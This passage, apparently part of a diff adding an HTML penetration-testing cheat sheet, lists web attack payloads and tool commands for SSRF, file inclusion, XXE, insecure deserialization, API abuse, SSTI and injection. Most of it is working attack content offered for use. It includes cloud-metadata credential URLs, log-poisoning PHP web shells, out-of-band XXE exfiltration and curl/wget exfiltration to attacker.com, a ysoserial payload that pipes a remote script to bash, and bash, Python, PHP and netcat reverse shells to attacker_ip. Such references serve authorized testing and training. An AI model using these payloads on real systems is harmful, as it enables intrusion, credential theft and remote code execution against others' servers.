+http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance</code></pre>
+
+                <h4>Google Cloud</h4>
+                <pre><code>http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+(Requires header: Metadata-Flavor: Google)</code></pre>
+
+                <h4>Azure</h4>
+                <pre><code>http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+(Requires header: Metadata: true)</code></pre>
+
+                <h3>Port Scanning via SSRF</h3>
+                <pre><code>http://127.0.0.1:22
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:3306 (MySQL)
+http://127.0.0.1:5432 (PostgreSQL)
+http://127.0.0.1:6379 (Redis)
+http://127.0.0.1:27017 (MongoDB)
+http://127.0.0.1:9200 (Elasticsearch)</code></pre>
+
+                <div class="tip">
+                    Check response time differences to identify open ports even if content isn't returned.
+                </div>
+
+                <h3>Blind SSRF Detection</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">Use Burp Collaborator or interact.sh</span><br>
+                    <span class="prompt">$</span> <span class="command">url=http://burp-collaborator-id.burpcollaborator.net</span><br>
+                    <span class="prompt">$</span> <span class="command">url=http://unique-id.interact.sh</span>
+                </div>
+
+                <h3>Exploitation Techniques</h3>
+                <h4>Redis Exploitation</h4>
+                <pre><code>gopher://127.0.0.1:6379/_SET%20test%20value
+gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html
+gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php</code></pre>
+
+                <h4>SMTP Exploitation</h4>
+                <pre><code>gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com</code></pre>
+
+                <h3>Tools for SSRF Testing</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">ssrfmap -r request.txt -p url -m readfiles</span><br>
+                    <span class="prompt">$</span> <span class="command">gopherus --exploit redis</span><br>
+                    <span class="prompt">$</span> <span class="command">ffuf -u https://target.com/fetch?url=http://FUZZ -w internal-ips.txt</span>
+                </div>
+
+                <div class="warning">
+                    SSRF can expose internal services, cloud credentials, and sensitive data. Handle discovered credentials responsibly.
+                </div>
+            </div>
+        </div>
+
+        <!-- LFI/RFI SECTION -->
+        <div id="lfi" class="section">
+            <div class="card">
+                <h2>📁 Local/Remote File Inclusion (LFI/RFI)</h2>
+                
+                <h3>Basic LFI Payloads</h3>
+                <pre><code>../../../etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+....//....//....//etc/passwd
+..%252f..%252f..%252fetc%252fpasswd (Double encoding)
+..\/..\/..\/etc/passwd
+..\\..\\..\\/etc/passwd</code></pre>
+
+                <h3>Common Linux Files to Test</h3>
+                <pre><code>/etc/passwd
+/etc/shadow (Requires root)
+/etc/hosts
+/etc/hostname
+/etc/issue
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/cwd/index.php
+/proc/self/fd/0-10
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/log/auth.log
+/home/user/.bash_history
+/home/user/.ssh/id_rsa
+/root/.ssh/id_rsa</code></pre>
+
+                <h3>Common Windows Files</h3>
+                <pre><code>C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\config\sam
+C:\Windows\win.ini
+C:\boot.ini
+C:\inetpub\wwwroot\web.config
+C:\xampp\apache\conf\httpd.conf
+C:\xampp\mysql\bin\my.ini</code></pre>
+
+                <h3>Bypass Techniques</h3>
+                <h4>Null Byte Injection (PHP < 5.3)</h4>
+                <pre><code>../../../etc/passwd%00
+../../../etc/passwd%00.jpg</code></pre>
+
+                <h4>Truncation (PHP < 5.3)</h4>
+                <pre><code>../../../etc/passwd............[add more dots until 4096 chars]</code></pre>
+
+                <h4>Wrapper Filters</h4>
+                <pre><code>php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+php://filter/zlib.deflate/convert.base64-encode/resource=index.php</code></pre>
+
+                <h4>Data Wrapper</h4>
+                <pre><code>data://text/plain,<?php phpinfo(); ?>
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</code></pre>
+
+                <h4>Input Wrapper</h4>
+                <pre><code>php://input
+POST body: <?php system($_GET['cmd']); ?></code></pre>
+
+                <h3>Log Poisoning</h3>
+                <h4>Apache/Nginx Log Poisoning</h4>
+                <pre><code>1. Inject PHP code in User-Agent:
+   User-Agent: <?php system($_GET['cmd']); ?>
+
+2. Access log file via LFI:
+   page.php?file=/var/log/apache2/access.log&cmd=whoami</code></pre>
+
+                <h4>SSH Log Poisoning</h4>
+                <pre><code>1. SSH with PHP payload as username:
+   ssh '<?php system($_GET['cmd']); ?>'@target.com
+
+2. Access auth.log:
+   page.php?file=/var/log/auth.log&cmd=whoami</code></pre>
+
+                <h3>Remote File Inclusion (RFI)</h3>
+                <div class="tip">
+                    RFI requires allow_url_include=On in PHP configuration (rare in modern setups).
+                </div>
+
+                <pre><code>page.php?file=http://attacker.com/shell.txt
+page.php?file=\\attacker.com\share\shell.txt
+page.php?file=ftp://attacker.com/shell.txt</code></pre>
+
+                <h3>LFI to RCE Techniques</h3>
+                <h4>Session File Inclusion</h4>
+                <pre><code>1. Inject PHP in session variable
+2. Include session file:
+   /var/lib/php/sessions/sess_[PHPSESSID]
+   /tmp/sess_[PHPSESSID]</code></pre>
+
+                <h4>Upload Temporary Files</h4>
+                <pre><code>1. Upload file, capture temp path from phpinfo()
+2. Include: /tmp/phpXXXXXX</code></pre>
+
+                <h4>Proc/self/environ</h4>
+                <pre><code>1. Inject in User-Agent header
+2. Include: /proc/self/environ</code></pre>
+
+                <h3>Automated LFI Testing</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">ffuf -u https://target.com/page?file=FUZZ -w lfi-wordlist.txt</span><br>
+                    <span class="prompt">$</span> <span class="command">dotdotpwn -m http -h target.com -x 80 -f /etc/passwd</span><br>
+                    <span class="prompt">$</span> <span class="command">liffy -u "http://target.com/page?file=FUZZ"</span>
+                </div>
+
+                <h3>Fuzzing for LFI</h3>
+                <pre><code># Common parameter names
+?file=
+?page=
+?include=
+?path=
+?document=
+?folder=
+?root=
+?pg=
+?style=
+?pdf=
+?template=
+?php_path=
+?doc=</code></pre>
+
+                <div class="warning">
+                    LFI can lead to source code disclosure, credential exposure, and RCE. Test carefully as it may cause application errors.
+                </div>
+            </div>
+        </div>
+
+        <!-- XXE SECTION -->
+        <div id="xxe" class="section">
+            <div class="card">
+                <h2>📄 XML External Entity (XXE)</h2>
+                
+                <h3>What is XXE?</h3>
+                <p>XXE exploits XML parsers that process external entity references, allowing file disclosure, SSRF, or RCE.</p>
+
+                <h3>Basic XXE Payload</h3>
+                <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;root&gt;
+    &lt;name&gt;&xxe;&lt;/name&gt;
+&lt;/root&gt;</code></pre>
+
+                <h3>File Disclosure</h3>
+                <pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"&gt;]&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///var/www/html/config.php"&gt;]&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;]&gt;</code></pre>
+
+                <h3>Blind XXE - Out-of-Band (OOB)</h3>
+                <pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"&gt; %xxe;]&gt;
+
+# evil.dtd on attacker server:
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "SYSTEM 'http://attacker.com/?data=%file;'"&gt;
+%eval;</code></pre>
+
+                <h3>SSRF via XXE</h3>
+                <pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://internal-server/admin"&gt;]&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;]&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://localhost:8080"&gt;]&gt;</code></pre>
+
+                <h3>Billion Laughs Attack (DoS)</h3>
+                <pre><code>&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol "lol"&gt;
+  &lt;!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"&gt;
+  &lt;!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"&gt;
+  &lt;!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"&gt;
+]&gt;
+&lt;lolz&gt;&lol3;&lt;/lolz&gt;</code></pre>
+
+                <h3>XXE in Different Data Formats</h3>
+                <h4>SOAP Request</h4>
+                <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+  &lt;soap:Body&gt;
+    &lt;foo&gt;&xxe;&lt;/foo&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;</code></pre>
+
+                <h4>SVG Upload</h4>
+                <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE svg [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;text x="0" y="16"&gt;&xxe;&lt;/text&gt;
+&lt;/svg&gt;</code></pre>
+
+                <h4>Office Documents (DOCX, XLSX)</h4>
+                <pre><code>1. Unzip document
+2. Edit word/document.xml or xl/workbook.xml
+3. Add XXE payload
+4. Rezip and upload</code></pre>
+
+                <h3>XXE in SAML</h3>
+                <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"&gt;
+  &lt;Issuer&gt;&xxe;&lt;/Issuer&gt;
+&lt;/samlp:Response&gt;</code></pre>
+
+                <h3>Bypass Filters</h3>
+                <pre><code># UTF-16 encoding
+&lt;?xml version="1.0" encoding="UTF-16"?&gt;
+
+# Using parameter entities
+&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "file:///etc/passwd"&gt; %xxe;]&gt;
+
+# XInclude
+&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;xi:include parse="text" href="file:///etc/passwd"/&gt;
+&lt;/foo&gt;</code></pre>
+
+                <h3>Detection</h3>
+                <ol>
+                    <li>Look for XML input (Content-Type: application/xml)</li>
+                    <li>Check file upload features accepting XML-based formats</li>
+                    <li>Test APIs with XML payloads</li>
+                    <li>Look for SOAP services</li>
+                    <li>Check RSS feeds, SVG uploads, document processing</li>
+                </ol>
+
+                <h3>Tools</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">xxeinjector --host=target.com --path=/upload --file=payload.xml</span><br>
+                    <span class="prompt">$</span> <span class="command">xmlrpc.py target.com</span>
+                </div>
+
+                <div class="warning">
+                    Always use OOB techniques for blind XXE. Setup a server to receive callbacks (Python SimpleHTTPServer, Burp Collaborator, interact.sh).
+                </div>
+            </div>
+        </div>
+
+        <!-- DESERIALIZATION SECTION -->
+        <div id="deserial" class="section">
+            <div class="card">
+                <h2>🔓 Insecure Deserialization</h2>
+                
+                <h3>What is Deserialization?</h3>
+                <p>Converting serialized data back to objects. Insecure deserialization allows attackers to manipulate serialized objects to execute arbitrary code, escalate privileges, or bypass authentication.</p>
+
+                <h3>PHP Object Injection</h3>
+                <h4>Identifying Serialized Data</h4>
+                <pre><code># PHP serialized format
+O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
+
+# Base64 encoded
+TzozOiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NDoicm9sZSI7czo1OiJhZG1pbiI7fQ==</code></pre>
+
+                <h4>Magic Methods Exploitation</h4>
+                <pre><code>__construct()   # Called when object is created
+__destruct()    # Called when object is destroyed
+__toString()    # Called when object is treated as string
+__wakeup()      # Called during unserialize()
+__sleep()       # Called during serialize()</code></pre>
+
+                <h4>Example Exploit</h4>
+                <pre><code>&lt;?php
+class User {
+    public $name;
+    public $isAdmin = false;
+    
+    function __destruct() {
+        if($this-&gt;isAdmin) {
+            eval($this-&gt;name);
+        }
+    }
+}
+
+// Create malicious object
+$obj = new User();
+$obj-&gt;name = "system('whoami');";
+$obj-&gt;isAdmin = true;
+echo serialize($obj);
+?&gt;</code></pre>
+
+                <h3>Java Deserialization</h3>
+                <h4>Identifying Java Serialized Data</h4>
+                <pre><code># Java serialized magic bytes
+rO0AB (Base64)
+ac ed 00 05 (Hex)
+
+# Common in:
+- Cookies
+- Hidden form fields
+- JMX endpoints
+- RMI services</code></pre>
+
+                <h4>Tools for Java Deserialization</h4>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">java -jar ysoserial.jar CommonsCollections5 'ping attacker.com' | base64</span><br>
+                    <span class="prompt">$</span> <span class="command">java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/shell.sh|bash'</span>
+                </div>
+
+                <h4>Common Gadget Chains</h4>
+                <ul>
+                    <li>CommonsCollections1-7</li>
+                    <li>Spring1-2</li>
+                    <li>Groovy1</li>
+                    <li>JRMPClient</li>
+                    <li>URLDNS (for detection)</li>
+                </ul>
+
+                <h3>Python Pickle</h3>
+                <h4>Identifying Pickle Data</h4>
+                <pre><code># Python pickle starts with
+\x80\x03 or \x80\x04 (protocol 3/4)
+
+# Base64 encoded
+gAN9cQAoWAUAAABjb2xvcnEBWAQAAABibHVl...</code></pre>
+
+                <h4>Exploit Example</h4>
+                <pre><code>import pickle
+import base64
+import os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('ping attacker.com',))
+
+payload = base64.b64encode(pickle.dumps(Exploit()))
+print(payload)</code></pre>
+
+                <h3>.NET Deserialization</h3>
+                <h4>Tools</h4>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">ysoserial.net -g ObjectDataProvider -f BinaryFormatter -c "calc.exe"</span><br>
+                    <span class="prompt">$</span> <span class="command">ysoserial.net -g WindowsIdentity -f Json.Net</span>
+                </div>
+
+                <h3>Node.js Deserialization</h3>
+                <pre><code># node-serialize module
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ping attacker.com')}()"}</code></pre>
+
+                <h3>Ruby Marshal</h3>
+                <pre><code># Ruby Marshal format
+\x04\x08
+
+# Exploit
+eval_code = "system('whoami')"
+payload = Marshal.dump(eval(eval_code))</code></pre>
+
+                <h3>Detection Methods</h3>
+                <ol>
+                    <li>Look for Base64-encoded cookies or parameters</li>
+                    <li>Decode and check for serialization patterns</li>
+                    <li>Test with URLDNS gadget chain (safe, DNS-based detection)</li>
+                    <li>Monitor for errors revealing framework versions</li>
+                    <li>Check server headers for technology stack</li>
+                </ol>
+
+                <h3>Exploitation Process</h3>
+                <ol>
+                    <li>Identify serialized data format</li>
+                    <li>Determine the language/framework</li>
+                    <li>Check for known vulnerable libraries</li>
+                    <li>Generate payload with appropriate gadget chain</li>
+                    <li>Encode payload (Base64, URL encoding)</li>
+                    <li>Send in cookie, POST data, or header</li>
+                    <li>Monitor for OOB callbacks or errors</li>
+                </ol>
+
+                <h3>Common Vulnerable Components</h3>
+                <table>
+                    <tr>
+                        <th>Language</th>
+                        <th>Library</th>
+                        <th>Tool</th>
+                    </tr>
+                    <tr>
+                        <td>Java</td>
+                        <td>Commons Collections</td>
+                        <td>ysoserial</td>
+                    </tr>
+                    <tr>
+                        <td>PHP</td>
+                        <td>unserialize()</td>
+                        <td>PHPGGC</td>
+                    </tr>
+                    <tr>
+                        <td>.NET</td>
+                        <td>BinaryFormatter</td>
+                        <td>ysoserial.net</td>
+                    </tr>
+                    <tr>
+                        <td>Python</td>
+                        <td>pickle</td>
+                        <td>Manual crafting</td>
+                    </tr>
+                    <tr>
+                        <td>Ruby</td>
+                        <td>Marshal</td>
+                        <td>Manual crafting</td>
+                    </tr>
+                </table>
+
+                <div class="warning">
+                    Deserialization can lead to RCE. Use OOB techniques (DNS/HTTP callbacks) to detect blind deserialization safely.
+                </div>
+            </div>
+        </div>
+
+        <!-- API TESTING SECTION -->
+        <div id="api" class="section">
+            <div class="card">
+                <h2>⚡ API Security Testing</h2>
+                
+                <h3>API Reconnaissance</h3>
+                <h4>Finding APIs</h4>
+                <ul>
+                    <li>Check /api, /v1, /v2, /rest, /graphql endpoints</li>
+                    <li>Look in JavaScript files for API calls</li>
+                    <li>Check mobile app traffic</li>
+                    <li>Browse documentation sites (docs.target.com, api.target.com)</li>
+                    <li>Check robots.txt and sitemap.xml</li>
+                </ul>
+
+                <h3>REST API Testing</h3>
+                <h4>HTTP Method Testing</h4>
+                <pre><code>GET /api/users/123
+PUT /api/users/123 (Try updating)
+DELETE /api/users/123 (Try deleting)
+POST /api/users (Try creating)
+PATCH /api/users/123 (Try partial update)
+OPTIONS /api/users (Check allowed methods)</code></pre>
+
+                <h4>Mass Assignment</h4>
+                <pre><code># Legitimate request
+POST /api/users
+{"username":"newuser","email":"user@test.com"}
+
+# Attack: Add admin field
+POST /api/users
+{"username":"newuser","email":"user@test.com","isAdmin":true,"role":"admin"}
+
+# Try different parameter names
+{"admin":true,"is_admin":true,"role":"administrator","privilege":"admin"}</code></pre>
+
+                <h3>API Authentication Bypass</h3>
+                <h4>Common Issues</h4>
+                <ul>
+                    <li>Missing authentication on sensitive endpoints</li>
+                    <li>API key in URL parameters (leaked in logs)</li>
+                    <li>Weak API key generation</li>
+                    <li>API keys in client-side code</li>
+                    <li>No rate limiting</li>
+                </ul>
+
+                <h4>Testing Techniques</h4>
+                <pre><code># Remove auth header entirely
+GET /api/admin/users
+(No Authorization header)
+
+# Try with empty token
+Authorization: Bearer 
+
+# Try with invalid token format
+Authorization: Bearer invalid
+
+# Try different authentication schemes
+Authorization: Basic YWRtaW46YWRtaW4=
+Authorization: Bearer token
+Authorization: API-Key token</code></pre>
+
+                <h3>GraphQL Security</h3>
+                <h4>Introspection Query</h4>
+                <pre><code>{
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type {
+          name
+        }
+      }
+    }
+  }
+}</code></pre>
+
+                <h4>Common GraphQL Vulnerabilities</h4>
+                <ul>
+                    <li>Introspection enabled in production</li>
+                    <li>No depth limiting (nested queries)</li>
+                    <li>No rate limiting</li>
+                    <li>Information disclosure via errors</li>
+                    <li>IDOR via object IDs</li>
+                </ul>
+
+                <h4>GraphQL Batching Attack</h4>
+                <pre><code>[
+  {"query":"mutation {login(user:\"admin\",pass:\"pass1\"){token}}"},
+  {"query":"mutation {login(user:\"admin\",pass:\"pass2\"){token}}"},
+  {"query":"mutation {login(user:\"admin\",pass:\"pass3\"){token}}"}
+  ...
+]</code></pre>
+
+                <h4>Field Suggestions</h4>
+                <pre><code># Typo in field name may reveal hidden fields
+{user(id:1){usernameee}} 
+
+# Error: Did you mean "username", "usernameHash", "usernameInternal"?</code></pre>
+
+                <h3>API Rate Limiting Bypass</h3>
+                <pre><code># IP rotation
+X-Forwarded-For: 1.2.3.4
+X-Real-IP: 1.2.3.5
+
+# Change user agent
+User-Agent: RandomAgent/1.0
+
+# Add custom headers
+X-Originating-IP: 1.2.3.4
+X-Remote-IP: 1.2.3.4
+X-Client-IP: 1.2.3.4
+
+# Race conditions (send multiple requests simultaneously)</code></pre>
+
+                <h3>API Fuzzing</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">ffuf -u https://api.target.com/v1/FUZZ -w api-endpoints.txt</span><br>
+                    <span class="prompt">$</span> <span class="command">wfuzz -w wordlist.txt https://api.target.com/v1/users/FUZZ</span><br>
+                    <span class="prompt">$</span> <span class="command">arjun -u https://api.target.com/endpoint</span>
+                </div>
+
+                <h3>API Version Testing</h3>
+                <pre><code>https://api.target.com/v1/users
+https://api.target.com/v2/users (Try different versions)
+https://api.target.com/v3/users
+https://api.target.com/internal/users
+https://api.target.com/beta/users
+
+# Header-based versioning
+Accept: application/vnd.api.v1+json
+Accept: application/vnd.api.v2+json</code></pre>
+
+                <h3>Content-Type Manipulation</h3>
+                <pre><code>Content-Type: application/json
+Content-Type: application/xml
+Content-Type: application/x-www-form-urlencoded
+Content-Type: text/plain
+
+# Server may parse differently, bypassing validation</code></pre>
+
+                <h3>API Testing Tools</h3>
+                <div class="grid">
+                    <div class="tool-card">
+                        <h4>Postman</h4>
+                        <p>API development & testing platform</p>
+                    </div>
+                    <div class="tool-card">
+                        <h4>Burp Suite</h4>
+                        <p>Intercept and modify API requests</p>
+                    </div>
+                    <div class="tool-card">
+                        <h4>OWASP ZAP</h4>
+                        <p>Automated API scanning</p>
+                    </div>
+                    <div class="tool-card">
+                        <h4>Arjun</h4>
+                        <p>Hidden parameter discovery</p>
+                    </div>
+                    <div class="tool-card">
+                        <h4>GraphQL Voyager</h4>
+                        <p>Visualize GraphQL schemas</p>
+                    </div>
+                    <div class="tool-card">
+                        <h4>Kiterunner</h4>
+                        <p>API endpoint & content discovery</p>
+                    </div>
+                </div>
+
+                <div class="tip">
+                    Always test with different user roles and authentication states. What's forbidden for User A might work for User B.
+                </div>
+            </div>
+        </div>
+
+        <!-- TOOLS SECTION -->
+        <div id="tools" class="section">
+            <div class="card">
+                <h2>🛠️ Essential Tools & Commands</h2>
+                
+                <h3>Reconnaissance Tools</h3>
+                <div class="grid">
+                    <div class="tool-card">
+                        <h4>Nmap</h4>
+                        <pre><code>nmap -sC -sV target.com
+nmap -p- --min-rate 1000 target.com
+nmap --script vuln target.com</code></pre>
+                    </div>
+                    <div class="tool-card">
+                        <h4>Sublist3r</h4>
+                        <pre><code>sublist3r -d target.com
+sublist3r -d target.com -b</code></pre>
+                    </div>
+                    <div class="tool-card">
+                        <h4>Amass</h4>
+                        <pre><code>amass enum -d target.com
+amass enum -passive -d target.com</code></pre>
+                    </div>
+                    <div class="tool-card">
+                        <h4>WhatWeb</h4>
+                        <pre><code>whatweb target.com
+whatweb -a 3 target.com</code></pre>
+                    </div>
+                </div>
+
+                <h3>Web Scanners</h3>
+                <div class="grid">
+                    <div class="tool-card">
+                        <h4>Nikto</h4>
+                        <pre><code>nikto -h https://target.com
+nikto -h target.com -p 80,443</code></pre>
+                    </div>
+                    <div class="tool-card">
+                        <h4>Nuclei</h4>
+                        <pre><code>nuclei -u https://target.com
+nuclei -l urls.txt -t cves/</code></pre>
+                    </div>
+                    <div class="tool-card">
+                        <h4>WPScan</h4>
+                        <pre><code>wpscan --url https://target.com
+wpscan --url target.com --enumerate u,p</code></pre>
+                    </div>
+                    <div class="tool-card">
+                        <h4>Wapiti</h4>
+                        <pre><code>wapiti -u https://target.com
+wapiti -u target.com --scope page</code></pre>
+                    </div>
+                </div>
+
+                <h3>Exploitation Tools</h3>
+                <div class="grid">
+                    <div class="tool-card">
+                        <h4>SQLMap</h4>
+                        <pre><code>sqlmap -u "url" --dbs
+sqlmap -r request.txt --batch</code></pre>
+                    </div>
+                    <div class="tool-card">
+                        <h4>Metasploit</h4>
+                        <pre><code>msfconsole
+search exploit_name
+use exploit/path
+set RHOSTS target
+exploit</code></pre>
+                    </div>
+                    <div class="tool-card">
+                        <h4>Hydra</h4>
+                        <pre><code>hydra -l admin -P pass.txt ssh://target
+hydra -L users.txt -P pass.txt target http-post-form</code></pre>
+                    </div>
+                    <div class="tool-card">
+                        <h4>John the Ripper</h4>
+                        <pre><code>john --wordlist=rockyou.txt hash.txt
+john --show hash.txt</code></pre>
+                    </div>
+                </div>
+
+                <h3>Burp Suite Extensions</h3>
+                <ul>
+                    <li><strong>Autorize</strong> - Automated access control testing</li>
+                    <li><strong>Logger++</strong> - Advanced logging</li>
+                    <li><strong>Turbo Intruder</strong> - Fast attacks</li>
+                    <li><strong>J2EE Scan</strong> - Java scanning</li>
+                    <li><strong>Param Miner</strong> - Parameter discovery</li>
+                    <li><strong>Upload Scanner</strong> - File upload testing</li>
+                    <li><strong>Collaborator Everywhere</strong> - Blind vulnerability detection</li>
+                </ul>
+
+                <h3>Wordlists</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">SecLists: https://github.com/danielmiessler/SecLists</span><br>
+                    <span class="prompt">$</span> <span class="command">PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings</span><br>
+                    <span class="prompt">$</span> <span class="command">/usr/share/wordlists/rockyou.txt</span><br>
+                    <span class="prompt">$</span> <span class="command">/usr/share/wordlists/dirb/</span>
+                </div>
+
+                <h3>Useful Commands</h3>
+                <h4>File Transfer</h4>
+                <pre><code># Python HTTP Server
+python3 -m http.server 8000
+
+# Download with wget
+wget http://attacker.com/file.txt
+
+# Download with curl
+curl http://attacker.com/file.txt -o file.txt
+
+# Netcat file transfer
+# Receiver: nc -lvp 4444 > file.txt
+# Sender: nc target_ip 4444 < file.txt</code></pre>
+
+                <h4>Reverse Shells</h4>
+                <pre><code># Bash
+bash -i >& /dev/tcp/attacker_ip/4444 0>&1
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# PHP
+php -r '$sock=fsockopen("attacker_ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Netcat
+nc -e /bin/sh attacker_ip 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker_ip 4444 >/tmp/f</code></pre>
+
+                <h4>TTY Shell Upgrade</h4>
+                <pre><code>python -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+Ctrl+Z
+stty raw -echo; fg
+reset</code></pre>
+            </div>
+        </div>
+
+        <!-- PAYLOADS SECTION -->
+        <div id="payloads" class="section">
+            <div class="card">
+                <h2>💣 Payload Library</h2>
+                
+                <h3>Command Injection Payloads</h3>
+                <pre><code># Basic
+; whoami
+| whoami
+|| whoami
+& whoami
+&& whoami
+$(whoami)
+`whoami`
+
+# Bypass filters
+who$()ami
+w\ho\am\i
+wh''oam''i
+who$'ami'
+$(wh$()ami)
+
+# Time-based detection
+; sleep 5
+| sleep 5 |
+; ping -c 5 127.0.0.1
+
+# Exfiltration
+; curl http://attacker.com/$(whoami)
+; wget http://attacker.com/$(cat /etc/passwd | base64)</code></pre>
+
+                <h3>Path Traversal Payloads</h3>
+                <pre><code>../
+..%2F
+..;/
+..\
+..\%5c
+%2e%2e%2f
+%252e%252e%252f
+..%c0%af
+....//
+....\/
+..%00/
+..%0d/
+..%5c
+..%c1%9c</code></pre>
+
+                <h3>Open Redirect Payloads</h3>
+                <pre><code>?url=https://evil.com
+?redirect=//evil.com
+?next=/\evil.com
+?return=https:evil.com
+?rurl=evil.com%2f%2f.target.com
+?dest=javascript:alert(1)
+?url=///evil.com
+?goto=https://google.com@evil.com</code></pre>
+
+                <h3>CRLF Injection</h3>
+                <pre><code>%0d%0aSet-Cookie:admin=true
+%0d%0aLocation:https://evil.com
+%0aSet-Cookie:sessionid=malicious
+%0d%0a%0d%0a<html>Injected Content</html></code></pre>
+
+                <h3>SSTI (Server-Side Template Injection)</h3>
+                <h4>Jinja2 (Python)</h4>
+                <pre><code>{{7*7}}
+{{config}}
+{{config.items()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}</code></pre>
+
+                <h4>Twig (PHP)</h4>
+                <pre><code>{{7*7}}
+{{_self.env.display("test")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}</code></pre>
+
+                <h4>Freemarker (Java)</h4>
+                <pre><code>${7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}</code></pre>
+
+                <h3>NoSQL Injection</h3>
+                <h4>MongoDB</h4>
+                <pre><code># Authentication bypass
+username[$ne]=admin&password[$ne]=admin
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+
+# Data extraction
+username[$regex]=^a.*&password[$ne]=1
+username[$regex]=^admin.*&password[$ne]=1</code></pre>
+
+                <h4>CouchDB</h4>
+                <pre><code>{"selector": {"_id": {"$gt": null}}}</code></pre>
+
+                <h3>LDAP Injection</h3>
+                <pre><code># Authentication bypass
+*)(uid=*))(|(uid=*
+admin)(&(password=*))
+*)(objectClass=*
+
+# Data extraction
+*)(cn=a*
+*)(mail=*@target.com)</code></pre>
+
+                <h3>CSV Injection</h3>
+                <pre><code>=cmd|'/c calc'!A1
+@SUM(1+1)*cmd|'/c calc'!A1
++cmd|'/c calc'!A1
+-cmd|'/c calc'!A1
+=1+1+cmd|'/c calc'!A1</code></pre>
+
+                <h3>Web Cache Poisoning</h3>
+                <pre><code>X-Forwarded-Host: evil.com
+X-Forwarded-Scheme: nothttps
